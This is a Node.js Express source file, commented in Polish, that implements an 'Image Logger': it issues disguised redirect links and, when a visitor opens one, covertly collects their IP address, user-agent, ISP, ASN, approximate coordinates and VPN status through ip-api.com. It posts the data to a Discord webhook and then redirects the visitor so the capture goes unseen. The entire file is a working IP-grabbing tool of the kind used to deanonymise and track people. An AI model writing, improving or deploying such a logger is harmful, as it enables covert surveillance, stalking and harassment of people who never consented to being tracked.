const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = 'TUTAJ_WKLEJ_SWOJ_WEBHOOK_URL';
const linksDatabase = {};

app.post('/generate', express.json(), (req, res) => {
    const { originalUrl } = req.body;
    const id = Math.random().toString(36).substring(2, 8);
    linksDatabase[id] = originalUrl;
    
    // Zmień na adres swojej domeny produkcyjnej
    res.json({ loggerUrl: `http://localhost:${PORT}/redirect/${id}` });
});

app.get('/redirect/:id', async (req, res) => {
    const id = req.params.id;
    const originalUrl = linksDatabase[id];

    if (!originalUrl) {
        return res.status(404).send('Link nie istnieje.');
    }

    const userAgent = req.headers['user-agent'] || 'Nieznany';
    
    // Pobieranie IP (w środowisku lokalnym '::1' lub '127.0.0.1' nie zwróci lokalizacji, 
    // funkcja zadziała w pełni po wrzuceniu na hosting)
    let userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (userIp.includes(',')) {
        userIp = userIp.split(',')[0].trim();
    }

    // Domyślne wartości, jeśli API nie zwróci danych
    let geoData = {
        status: "fail",
        country: "Nieznany",
        regionName: "Nieznany",
        city: "Nieznany",
        isp: "Nieznany",
        as: "Nieznany",
        lat: 0,
        lon: 0,
        timezone: "Nieznany",
        hosting: false
    };

    // Pobieranie szczegółowych danych o IP za pomocą darmowego ip-api.com
    // Pola (fields): country,regionName,city,isp,as,lat,lon,timezone,hosting,status
    try {
        // Testowo dla localhost możesz podmienić userIp na prawdziwe IP, np. '181.41.202.157'
        const ipToCheck = (userIp === '::1' || userIp === '127.0.0.1') ? '181.41.202.157' : userIp;
        const geoResponse = await axios.get(`http://ip-api.com/json/${ipToCheck}?fields=status,message,country,regionName,city,isp,as,lat,lon,timezone,hosting`);
        
        if (geoResponse.data && geoResponse.data.status === 'success') {
            geoData = geoResponse.data;
        }
    } catch (err) {
        console.error("Błąd podczas pobierania GeoIP:", err.message);
    }

    // Budowanie struktury Discord Embed dokładnie tak, jak na zdjęciu
    const discordPayload = {
        embeds: [{
            title: "🌐 Image Logger - IP Logged",
            description: "**A User Opened the Original Link!**\n\n**Endpoint:** `/api/image`",
            color: 1752220, // Kolor paska bocznego (morski/turkusowy)
            fields: [
                {
                    name: "📌 IP Info:",
                    value: [
                        `**IP:** \`${userIp}\``,
                        `**Provider:** \`${geoData.isp}\``,
                        `**ASN:** \`${geoData.as}\``,
                        `**Country:** \`${geoData.country}\``,
                        `**Region:** \`${geoData.regionName}\``,
                        `**City:** \`${geoData.city}\``,
                        `**Coords:** \`${geoData.lat}, ${geoData.lon}\` (Approximate)`,
                        `**Timezone:** \`${geoData.timezone}\``,
                        `**VPN/Hosting:** \`${geoData.hosting ? 'True' : 'False'}\``,
                        `**User-Agent:** \`${userAgent.substring(0, 100)}...\``
                    ].join('\n'),
                    inline: false
                }
            ],
            footer: {
                text: `Czas zdarzenia: ${new Date().toLocaleString('pl-PL')}`
            }
        }]
    };

    // Wysyłanie gotowego Embedu na Webhook
    try {
        await axios.post(WEBHOOK_URL, discordPayload);
    } catch (error) {
        console.error("Błąd Webhooka:", error.response ? error.response.data : error.message);
    }

    // Natychmiastowe przekierowanie
    res.redirect(originalUrl);
});

app.listen(PORT, () => console.log(`Serwer logujący działa na porcie ${PORT}`));
